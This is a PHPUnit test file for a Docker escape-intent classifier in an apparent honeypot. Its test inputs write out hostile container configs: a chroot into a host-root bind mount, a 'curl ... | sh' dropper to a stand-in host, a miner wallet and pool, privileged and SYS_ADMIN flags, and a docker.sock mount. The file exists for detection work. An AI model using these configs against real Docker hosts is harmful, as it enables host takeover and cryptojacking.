<?php

declare(strict_types=1);

namespace Funnypot\Tests\App\Docker;

use Funnypot\App\Docker\EscapeIntent;
use PHPUnit\Framework\TestCase;

/**
 * The pure escape-intent classifier: it extracts a bounded, structured record from a create/exec body,
 * derives fixed-vocabulary signals + a class, caps everything, and NEVER stores a cleartext registry
 * password (only a seed-keyed HMAC correlation token). It runs nothing and decodes nothing executable.
 */
final class EscapeIntentTest extends TestCase
{
    private const SEED = 7;
    private const KEY = 'escape-intent-test-registry-token-key-a';

    private function intent(string $key = self::KEY): EscapeIntent
    {
        return new EscapeIntent(self::SEED, $key);
    }

    /**
     * The captured-password correlation token is keyed on the PRIVATE registry-token key, not the
     * public persona seed: the same seed with two different keys yields two unrelated tokens, the
     * same key yields the same token, and 128 bits are retained.
     */
    public function test_pw_token_is_keyed_on_the_private_key_and_keeps_128_bits(): void
    {
        $body = ['Image' => 'alpine', 'Cmd' => ['sh']];
        $auth = base64_encode((string) json_encode(['username' => 'u', 'password' => 'hunter2', 'serveraddress' => 'r.example']));
        $a = $this->intent(self::KEY)->fromCreate($body, '', ['X-Registry-Auth' => $auth]);
        $b = $this->intent(self::KEY)->fromCreate($body, '', ['X-Registry-Auth' => $auth]);
        $c = $this->intent('escape-intent-test-registry-token-key-b')->fromCreate($body, '', ['X-Registry-Auth' => $auth]);

        self::assertMatchesRegularExpression('/^[0-9a-f]{32}$/', $a['registry_auth']['pw_token']);
        self::assertSame($a['registry_auth']['pw_token'], $b['registry_auth']['pw_token'], 'same key ⇒ same correlation token');
        self::assertNotSame($a['registry_auth']['pw_token'], $c['registry_auth']['pw_token'], 'same persona seed, other key ⇒ unrelated token');
        self::assertNotSame(substr(hash_hmac('sha256', 'hunter2', 'fp-docker|' . self::SEED), 0, 32), $a['registry_auth']['pw_token'], 'never the public-seed keyed form');
    }

    public function test_teamtnt_style_create_yields_escape_class_and_every_field(): void
    {
        $body = [
            'Image' => 'alpine',
            'Cmd' => ['chroot', '/host', 'sh', '-c', 'curl -s http://x/a.sh|sh'],
            'Env' => ['POOL=stratum+tcp://p:3333', 'WALLET=44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A'],
            'HostConfig' => [
                'Binds' => ['/:/host'], 'Privileged' => true, 'PidMode' => 'host', 'NetworkMode' => 'host',
                'CapAdd' => ['SYS_ADMIN'], 'SecurityOpt' => ['seccomp=unconfined'],
            ],
        ];
        $secret = 'Pa55-Zz-DISTINCTIVE';
        $auth = base64_encode((string) json_encode(['username' => 'u', 'password' => $secret, 'serveraddress' => 'https://index.docker.io/v1/']));
        $rec = $this->intent()->fromCreate($body, 'name=sysupdate', ['X-Registry-Auth' => $auth]);

        self::assertSame('docker_escape', $rec['class']);
        foreach (['bind-root', 'privileged', 'pid-host', 'net-host', 'cap-sys-admin', 'seccomp-unconfined', 'chroot-host', 'dropper', 'miner'] as $sig) {
            self::assertContains($sig, $rec['signals'], "expected signal {$sig}");
        }
        self::assertSame(['/:/host'], $rec['binds']);
        self::assertTrue($rec['privileged']);
        self::assertSame('host', $rec['pid_mode']);
        self::assertSame('docker.io', $rec['image_ref']['registry']);
        self::assertSame('alpine:latest', $rec['image_ref']['display']);
        self::assertSame(['chroot', '/host', 'sh', '-c', 'curl -s http://x/a.sh|sh'], $rec['cmd']);
        self::assertCount(2, $rec['env']);
        self::assertSame('sysupdate', $rec['name']);
        self::assertSame('u', $rec['registry_auth']['username']);
        self::assertStringNotContainsString($secret, (string) json_encode($rec), 'the password must never appear');
        self::assertMatchesRegularExpression('/^[0-9a-f]{32}$/', $rec['registry_auth']['pw_token']);
    }

    public function test_docker_socket_mount_is_flagged(): void
    {
        $rec = $this->intent()->fromCreate(['Image' => 'alpine', 'HostConfig' => ['Binds' => ['/var/run/docker.sock:/var/run/docker.sock']]], '', []);
        self::assertContains('bind-docker-sock', $rec['signals']);
        self::assertSame('docker_escape', $rec['class']);
    }

    public function test_cgroup_parent_and_mounts_readonly_are_parsed(): void
    {
        $rec = $this->intent()->fromCreate([
            'Image' => 'alpine',
            'HostConfig' => [
                'CgroupParent' => '/evil',
                'Mounts' => [['Type' => 'bind', 'Source' => '/etc', 'Target' => '/host-etc', 'ReadOnly' => true]],
                'UTSMode' => 'host',
            ],
        ], '', []);
        self::assertContains('cgroup-escape', $rec['signals']);
        self::assertContains('bind-sensitive', $rec['signals']);
        self::assertSame('/evil', $rec['cgroup_parent']);
        self::assertSame('host', $rec['uts_mode']);
        self::assertTrue($rec['mounts'][0]['read_only']);
        self::assertSame('/etc', $rec['mounts'][0]['source']);
    }

    public function test_identity_token_auth_records_presence_only(): void
    {
        $auth = base64_encode((string) json_encode(['identitytoken' => 'abc.def.ghi']));
        $rec = $this->intent()->fromCreate(['Image' => 'alpine'], '', ['X-Registry-Auth' => $auth]);
        self::assertTrue($rec['registry_auth']['has_identitytoken']);
        self::assertArrayNotHasKey('pw_token', $rec['registry_auth']);
    }

    public function test_plain_create_with_no_escape_is_docker_api(): void
    {
        $rec = $this->intent()->fromCreate(['Image' => 'redis:7', 'Cmd' => ['redis-server']], '', []);
        self::assertSame('docker_api', $rec['class']);
        self::assertSame([], $rec['signals']);
        self::assertEqualsWithDelta(0.8, EscapeIntent::confidenceFor($rec), 0.001);
    }

    public function test_confidence_reflects_class_and_payload(): void
    {
        $escape = $this->intent()->fromCreate(['Image' => 'a', 'HostConfig' => ['Privileged' => true]], '', []);
        self::assertEqualsWithDelta(0.95, EscapeIntent::confidenceFor($escape), 0.001);
        $miner = $this->intent()->fromCreate(['Image' => 'xmrig/xmrig'], '', []);
        self::assertEqualsWithDelta(0.9, EscapeIntent::confidenceFor($miner), 0.001);
    }

    public function test_caps_hold_under_a_huge_body(): void
    {
        $env = [];
        for ($i = 0; $i < 5000; $i++) {
            $env[] = "K{$i}=v";
        }
        $rec = $this->intent()->fromCreate([
            'Image' => str_repeat('a', 4000),
            'Cmd' => array_fill(0, 200, str_repeat('x', 4000)),
            'Env' => $env,
            'HostConfig' => ['Binds' => array_fill(0, 100, '/a:/b')],
        ], '', []);
        self::assertLessThanOrEqual(32, count($rec['env']));
        self::assertLessThanOrEqual(16, count($rec['cmd']));
        self::assertLessThanOrEqual(16, count($rec['binds']));
        self::assertLessThanOrEqual(255, strlen($rec['image']));
        self::assertLessThan(20000, strlen((string) json_encode($rec)));
    }

    public function test_malformed_and_non_utf8_bodies_do_not_throw(): void
    {
        $rec = $this->intent()->fromCreate([], '', []);
        self::assertSame('docker_api', $rec['class']);
        self::assertSame([], $rec['binds']);

        // A non-UTF-8 image byte must be scrubbed so the record json-encodes cleanly (no silent drop).
        $rec2 = $this->intent()->fromCreate(['Image' => "alp\xffine", 'Cmd' => ["bad\xff\xfe"]], '', []);
        self::assertNotFalse(json_encode($rec2), 'record must json-encode even with hostile bytes');
    }

    public function test_exec_captures_the_command(): void
    {
        $rec = $this->intent()->fromExec(['Cmd' => ['sh', '-c', 'id'], 'User' => 'root']);
        self::assertSame(['sh', '-c', 'id'], $rec['cmd']);
        self::assertSame('root', $rec['user']);
        self::assertSame('docker_api', $rec['class']);
    }

    public function test_decode_body_is_depth_capped(): void
    {
        // A deeply nested body must decode to [] (too deep) rather than blow the stack.
        $deep = '{"a":' . str_repeat('[', 20) . str_repeat(']', 20) . '}';
        self::assertSame([], EscapeIntent::decodeBody($deep));
        self::assertSame([], EscapeIntent::decodeBody('not json'));
        self::assertSame(['Image' => 'alpine'], EscapeIntent::decodeBody('{"Image":"alpine"}'));
    }
}
